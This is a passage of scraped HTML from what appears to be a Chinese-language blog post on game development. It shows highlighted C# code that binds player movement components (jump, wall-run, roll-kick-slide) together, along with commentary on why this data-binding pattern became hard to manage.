class=\"crayon-h\">        </span><span class=\"crayon-e\">set</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c1516921176195-10\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c1516921176195-11\"><span class=\"crayon-h\">            </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">_value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">value</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c1516921176195-12\"> </div><div class=\"crayon-line\" id=\"crayon-594bab39c1516921176195-13\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">bindings</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Count</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Math</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Min</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">bindings</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Count</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c1516921176195-14\"><span class=\"crayon-h\">                </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">bindings</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">OnChanged</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c1516921176195-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c1516921176195-16\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c1516921176195-17\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0029 seconds] -->\r\n<p>游戏中的每个单字段，甚至最后一个布尔值，都附带了一个不好控制的动态分配数组。</p>\n<p>看一下属性绑定变更通知的循环，就能够了解我使用这个模式所遇到的问题了。它必须向后迭代绑定列表，因为绑定可以根据实际需要添加或删除 UI 元素，导致绑定列表更改。</p>\n<p>然而，由于我对数据绑定如此热爱，所以我在进行数据绑定之前创建了整个游戏。我将对象分解成组件，并将对象的属性绑定在一起。很快，事情就失控了。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bab39c151a105690089\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\njump.Add(new Binding&lt;bool&gt;(jump.Crouched, player.Character.Crouched));\r\njump.Add(new TwoWayBinding&lt;bool&gt;(player.Character.IsSupported, jump.IsSupported));\r\njump.Add(new TwoWayBinding&lt;bool&gt;(player.Character.HasTraction, jump.HasTraction));\r\njump.Add(new TwoWayBinding&lt;Vector3&gt;(player.Character.LinearVelocity, jump.LinearVelocity));\r\njump.Add(new TwoWayBinding&lt;BEPUphysics.Entities.Entity&gt;(jump.SupportEntity, player.Character.SupportEntity));\r\njump.Add(new TwoWayBinding&lt;Vector3&gt;(jump.SupportVelocity, player.Character.SupportVelocity));\r\njump.Add(new Binding&lt;Vector2&gt;(jump.AbsoluteMovementDirection, player.Character.MovementDirection));\r\njump.Add(new Binding&lt;WallRun.State&gt;(jump.WallRunState, wallRun.CurrentState));\r\njump.Add(new Binding&lt;float&gt;(jump.Rotation, rotation.Rotation));\r\njump.Add(new Binding&lt;Vector3&gt;(jump.Position, transform.Position));\r\njump.Add(new Binding&lt;Vector3&gt;(jump.FloorPosition, floor));\r\njump.Add(new Binding&lt;float&gt;(jump.MaxSpeed, player.Character.MaxSpeed));\r\njump.Add(new Binding&lt;float&gt;(jump.JumpSpeed, player.Character.JumpSpeed));\r\njump.Add(new Binding&lt;float&gt;(jump.Mass, player.Character.Mass));\r\njump.Add(new Binding&lt;float&gt;(jump.LastRollKickEnded, rollKickSlide.LastRollKickEnded));\r\njump.Add(new Binding&lt;Voxel&gt;(jump.WallRunMap, wallRun.WallRunVoxel));\r\njump.Add(new Binding&lt;Direction&gt;(jump.WallDirection, wallRun.WallDirection));\r\njump.Add(new CommandBinding&lt;Voxel, Voxel.Coord, Direction&gt;(jump.WalkedOn, footsteps.WalkedOn));\r\njump.Add(new CommandBinding(jump.DeactivateWallRun, (Action)wallRun.Deactivate));\r\njump.FallDamage = fallDamage;\r\njump.Predictor = predictor;\r\njump.Bind(model);\r\njump.Add(new TwoWayBinding&lt;Voxel&gt;(wallRun.LastWallRunMap, jump.LastWallRunMap));\r\njump.Add(new TwoWayBinding&lt;Direction&gt;(wallRun.LastWallDirection, jump.LastWallDirection));\r\njump.Add(new TwoWayBinding&lt;bool&gt;(rollKickSlide.CanKick, jump.CanKick));\r\njump.Add(new TwoWayBinding&lt;float&gt;(player.Character.LastSupportedSpeed, jump.LastSupportedSpeed));\r\n\r\nwallRun.Add(new Binding&lt;bool&gt;(wallRun.IsSwimming, player.Character.IsSwimming));\r\nwallRun.Add(new TwoWayBinding&lt;Vector3&gt;(player.Character.LinearVelocity, wallRun.LinearVelocity));\r\nwallRun.Add(new TwoWayBinding&lt;Vector3&gt;(transform.Position, wallRun.Position));\r\nwallRun.Add(new TwoWayBinding&lt;bool&gt;(player.Character.IsSupported, wallRun.IsSupported));\r\nwallRun.Add(new CommandBinding(wallRun.LockRotation, (Action)rotation.Lock));\r\nwallRun.Add(new CommandBinding&lt;float&gt;(wallRun.UpdateLockedRotation, rotation.UpdateLockedRotation));\r\nvault.Add(new CommandBinding(wallRun.Vault, delegate() { vault.Go(true); }));\r\nwallRun.Predictor = predictor;\r\nwallRun.Add(new Binding&lt;float&gt;(wallRun.Height, player.Character.Height));\r\nwallRun.Add(new Binding&lt;float&gt;(wallRun.JumpSpeed, player.Character.JumpSpeed));\r\nwallRun.Add(new Binding&lt;float&gt;(wallRun.MaxSpeed, player.Character.MaxSpeed));\r\nwallRun.Add(new TwoWayBinding&lt;float&gt;(rotation.Rotation, wallRun.Rotation));\r\nwallRun.Add(new TwoWayBinding&lt;bool&gt;(player.Character.AllowUncrouch, wallRun.AllowUncrouch));\r\nwallRun.Add(new TwoWayBinding&lt;bool&gt;(player.Character.HasTraction, wallRun.HasTraction));\r\nwallRun.Add(new Binding&lt;float&gt;(wallRun.LastWallJump, jump.LastWallJump));\r\nwallRun.Add(new Binding&lt;float&gt;(player.Character.LastSupportedSpeed, wallRun.LastSupportedSpeed));\r\nplayer.Add(new Binding&lt;WallRun.State&gt;(player.Character.WallRunState, wallRun.CurrentState));\r\n\r\ninput.Bind(rollKickSlide.RollKickButton, settings.RollKick);\r\nrollKickSlide.Add(new Binding&lt;bool&gt;(rollKickSlide.EnableCrouch, player.EnableCrouch));\r\nrollKickSlide.Add(new Binding&lt;float&gt;(rollKickSlide.Rotation, rotation.Rotation));\r\nrollKickSlide.Add(new Binding&lt;bool&gt;(rollKickSlide.IsSwimming, player.Character.IsSwimming));\r\nrollKickSlide.Add(new Binding&lt;bool&gt;(rollKickSlide.IsSupported, player.Character.IsSupported));\r\nrollKickSlide.Add(new Binding&lt;Vector3&gt;(rollKickSlide.FloorPosition, floor));\r\nrollKickSlide.Add(new Binding&lt;float&gt;(rollKickSlide.Height, player.Character.Height));\r\nrollKickSlide.Add(new Binding&lt;float&gt;(rollKickSlide.MaxSpeed, player.Character.MaxSpeed));\r\nrollKickSlide.Add(new Binding&lt;float&gt;(rollKickSlide.JumpSpeed, player.Character.JumpSpeed));\r\nrollKickSlide.Add(new Binding&lt;Vector3&gt;(rollKickSlide.SupportVelocity, player.Character.SupportVelocity));\r\nrollKickSlide.Add(new TwoWayBinding&lt;bool&gt;(wallRun.EnableEnhancedWallRun, rollKickSlide.EnableEnhancedRollSlide));\r\nrollKickSlide.Add(new TwoWayBinding&lt;bool&gt;(player.Character.AllowUncrouch, rollKickSlide.AllowUncrouch));\r\nrollKickSlide.Add(new TwoWayBinding&lt;bool&gt;(player.Character.Crouched, rollKickSlide.Crouched));\r\nrollKickSlide.Add(new TwoWayBinding&lt;bool&gt;(player.Character.EnableWalking, rollKickSlide.EnableWalking));\r\nrollKickSlide.Add(new TwoWayBinding&lt;Vector3&gt;(player.Character.LinearVelocity, rollKickSlide.LinearVelocity));\r\nrollKickSlide.Add(new TwoWayBinding&lt;Vector3&gt;(transform.Position, rollKickSlide.Position));\r\nrollKickSlide.Predictor = predictor;\r\nrollKickSlide.Bind(model);\r\nrollKickSlide.VoxelTools = voxelTools;\r\nrollKickSlide.Add(new CommandBinding(rollKickSlide.DeactivateWallRun, (Action)wallRun.Deactivate));\r\nrollKickSlide.Add(new CommandBinding(rollKickSlide.Footstep, footsteps.Footstep));</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-55\">55</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-56\">56</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-57\">57</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-58\">58</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-59\">59</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-60\">60</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-61\">61</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-62\">62</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-63\">63</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-64\">64</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c151a105690089-65\">65</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c151a105690089-66\">66</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-1\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">bool</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Crouched</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Crouched</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-2\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TwoWayBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">bool</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">IsSupported</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">IsSupported</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-3\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TwoWayBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">bool</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">HasTraction</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">HasTraction</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-4\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TwoWayBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Vector3</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">LinearVelocity</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">LinearVelocity</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-5\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TwoWayBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">BEPUphysics</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Entities</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Entity</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">SupportEntity</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">SupportEntity</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-6\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TwoWayBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Vector3</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">SupportVelocity</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">SupportVelocity</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-7\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Vector2</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">AbsoluteMovementDirection</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">MovementDirection</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-8\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">WallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">State</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">WallRunState</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">CurrentState</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-9\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">float</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Rotation</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rotation</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Rotation</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-10\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Vector3</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Position</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">transform</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Position</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-11\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Vector3</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">FloorPosition</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">floor</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-12\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">float</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">MaxSpeed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">MaxSpeed</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-13\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">float</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">JumpSpeed</span><span class=\"crayon-sy\">,</span><span 